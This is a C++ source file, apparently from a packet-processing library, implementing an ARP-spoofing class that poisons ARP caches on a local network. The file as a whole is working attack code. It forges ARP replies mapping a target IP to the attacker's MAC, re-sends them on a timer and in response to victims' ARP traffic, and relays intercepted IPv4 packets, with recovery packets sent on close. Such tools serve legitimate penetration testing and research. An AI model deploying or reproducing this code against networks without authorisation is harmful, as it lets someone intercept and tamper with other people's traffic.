#include "garpspoof.h"

// ----------------------------------------------------------------------------
// GArpSpoof
// ----------------------------------------------------------------------------
GArpSpoof::GArpSpoof(QObject* parent) : GArpSpoofBaseDevice(parent) {
}

GArpSpoof::~GArpSpoof() {
	close();
}

bool GArpSpoof::doOpen() {
	if (!enabled_) return true;

	if (filter_ != "") {
		SET_ERR(GErr::FAIL, "filter must be blank");
		return false;
	}
	if (!GArpSpoofBaseDevice::doOpen()) return false;

	flowList_.clear();
	atm_.deleteUnresolved();

	for (GObj* obj: flows_) {
		GArpSpoofFlow* propFlow = PArpSpoofFlow(obj);
		if (!propFlow->enabled_) continue;

		GIp senderIp = propFlow->senderIp_;
		GMac senderMac = propFlow->senderMac_;
		GIp targetIp = propFlow->targetIp_;
		GMac targetMac = propFlow->targetMac_;

		Q_ASSERT(intf_ != nullptr);
		if (senderIp == intf_->ip()) {
			QString msg = QString("sender(%1) can not be my ip").arg(QString(senderIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		if (targetIp == intf_->ip()) {
			QString msg = QString("target(%1) can not be my ip").arg(QString(targetIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		if (senderIp == targetIp) {
			QString msg = QString("sender(%1) and target(%2) can not be same").arg(QString(senderIp), QString(targetIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		Flow flow(senderIp, senderMac, targetIp, targetMac);
		flowList_.push_back(flow);
		if (atm_.find(senderIp) == atm_.end())
			atm_.insert(flow.senderIp_, flow.senderMac_);
		if (atm_.find(targetIp) == atm_.end())
			atm_.insert(flow.targetIp_, flow.targetMac_);
	}

	atm_.intfName_ = intfName_;
	if (!atm_.open()) {
		err = atm_.err;
		return false;
	}
	bool res = atm_.wait();
	atm_.close();
	if (!res) {
		QString msg = "can not find all host(s) ";
		for (GAtm::iterator it = atm_.begin(); it != atm_.end(); it++) {
			GMac mac = it.value();
			if (mac.isNull()) {
				GIp ip = it.key();
				msg += QString(ip) += " ";
			}
		}
		SET_ERR(GErr::FAIL, msg);
		return false;
	}

	flowMap_.clear();
	for(Flow& flow: flowList_) {
		if (flow.senderMac_.isNull())
			flow.senderMac_ = atm_.find(flow.senderIp_).value();
		if (flow.targetMac_.isNull())
			flow.targetMac_ = atm_.find(flow.targetIp_).value();
		GFlow::IpFlowKey ipFlowKey(flow.senderIp_, flow.targetIp_);
		FlowMap::iterator it = flowMap_.find(ipFlowKey);
		if (it == flowMap_.end())
			flowMap_.insert(ipFlowKey, flow);
		else
			*it = flow;
	}

	myMac_ = virtualMac_.isNull() ? intf_->mac() : virtualMac_;

	for (Flow& flow: flowList_) {
		flow.makePacket(&flow.infectPacket_, myMac_, true);
		flow.makePacket(&flow.recoverPacket_, myMac_, false);
	}

	sendArpInfectAll();

	if (infectInterval_ != 0)
		infectThread_.start();

	return true;
}

bool GArpSpoof::doClose() {
	if (!enabled_) return true;

	infectThread_.we_.wakeAll();
	infectThread_.wait();

	for (int i = 0; i < 5; i++) {
		sendARPRecoverAll();
		QThread::msleep(sendInterval_);
	}

	return GArpSpoofBaseDevice::doClose();
}

GPacket::Result GArpSpoof::read(GPacket* packet) {
	while (true) {
		GPacket::Result res = GArpSpoofBaseDevice::read(packet);
		if (res == GPacket::Eof || res == GPacket::Fail) return res;
		if (res == GPacket::None) continue;

		GEthHdr* ethHdr = packet->ethHdr_;
		Q_ASSERT(ethHdr != nullptr);

		// attacker sending packet?
		if (ethHdr->smac() == myMac_) continue;

		switch (ethHdr->type()) {
			case GEthHdr::Arp: {
				GArpHdr* arpHdr = packet->arpHdr_;
				processArp(packet);
				Q_ASSERT(arpHdr != nullptr);
				for (Flow& flow: flowList_) {
					bool infect = false;
					if (arpHdr->sip() == flow.senderIp_ && arpHdr->tip() == flow.targetIp_) { // sender > target ARP packet
						qDebug() << QString("sender(%1) to target(%2) ARP packet").arg(QString(flow.senderIp_), QString(flow.targetIp_));
						infect = true;
					} else
					if (arpHdr->sip() == flow.targetIp_ && ethHdr->dmac() == GMac::broadcastMac()) { // target to any ARP packet
						qDebug() << QString("target(%1) to any(%2) ARP packet").arg(QString(flow.targetIp_), QString(flow.senderIp_));
						infect = true;
					}
					if (infect)
						sendArpInfect(&flow);
				}
				continue;
			}
			case GEthHdr::Ip4: {
				GIpHdr* ipHdr = packet->ipHdr_;
				Q_ASSERT(ipHdr != nullptr);
				GIp adjSrcIp = intf_->getAdjIp(ipHdr->sip());
				GIp adjDstIp = intf_->getAdjIp(ipHdr->dip());
				GFlow::IpFlowKey key(adjSrcIp, adjDstIp);
				FlowMap::iterator it = flowMap_.find(key);
				if (it == flowMap_.end()) break;
				Flow& flow = it.value();
				ethHdr->dmac_ = flow.targetMac_;
				return GPacket::Ok;
			}
			default: continue;
		}
	}
}

GPacket::Result GArpSpoof::write(GBuf buf) {
	return GArpSpoofBaseDevice::write(buf);
}

GPacket::Result GArpSpoof::write(GPacket* packet) {
	return GArpSpoofBaseDevice::write(packet);
}

GPacket::Result GArpSpoof::relay(GPacket* packet) {
	Q_ASSERT(packet->ethHdr_ != nullptr);
	packet->ethHdr_->smac_ = myMac_;
	return write(packet);
}

GArpSpoof::Flow::Flow(GIp senderIp, GMac senderMac, GIp targetIp, GMac targetMac) {
	senderIp_ = senderIp;
	senderMac_ = senderMac;
	targetIp_ = targetIp;
	targetMac_ = targetMac;
}

void GArpSpoof::Flow::makePacket(GEthArpHdr* packet, GMac myMac, bool infect) {
	packet->ethHdr_.dmac_ = senderMac_;
	packet->ethHdr_.smac_ = myMac;
	packet->ethHdr_.type_ = htons(GEthHdr::Arp);

	packet->arpHdr_.hrd_ = htons(GArpHdr::ETHER);
	packet->arpHdr_.pro_ = htons(GEthHdr::Ip4);
	packet->arpHdr_.hln_ = sizeof(GMac);
	packet->arpHdr_.pln_ = sizeof(GIp);
	packet->arpHdr_.op_ = htons(GArpHdr::Reply);
	packet->arpHdr_.smac_ = infect ? myMac : targetMac_; // infect(true) or recover(false)
	packet->arpHdr_.sip_ = htonl(targetIp_);
	packet->arpHdr_.tmac_ = senderMac_;
	packet->arpHdr_.tip_ = htonl(senderIp_);
}

void GArpSpoof::InfectThread::run() {
	while (true) {
		if (we_.wait(arpSpoof_->infectInterval_)) break;
		arpSpoof_->sendArpInfectAll();
	}
}

bool GArpSpoof::sendArpInfectAll() {
	QMutexLocker(&flowList_.m_);
	for (Flow& flow: flowList_) {
		if (!sendArpInfect(&flow))
			return false;
		QThread::msleep(sendInterval_);
	}
	return true;
}

bool GArpSpoof::sendArpInfect(Flow* flow) {
	GPacket::Result res = write(GBuf(pbyte(&flow->infectPacket_), sizeof(flow->infectPacket_)));
	return res == GPacket::Ok;
}

bool GArpSpoof::sendARPRecoverAll() {
	QMutexLocker(&flowList_.m_);
	for (Flow& flow: flowList_) {
		if (!sendArpRecover(&flow))
			return false;
		QThread::msleep(sendInterval_);
	}
	return true;
}

bool GArpSpoof::sendArpRecover(Flow* flow) {
	GPacket::Result res = write(GBuf(pbyte(&flow->recoverPacket_), sizeof(flow->recoverPacket_)));
	return res == GPacket::Ok;
}

void GArpSpoof::processArp(GPacket* packet) {
	(void)packet;
}
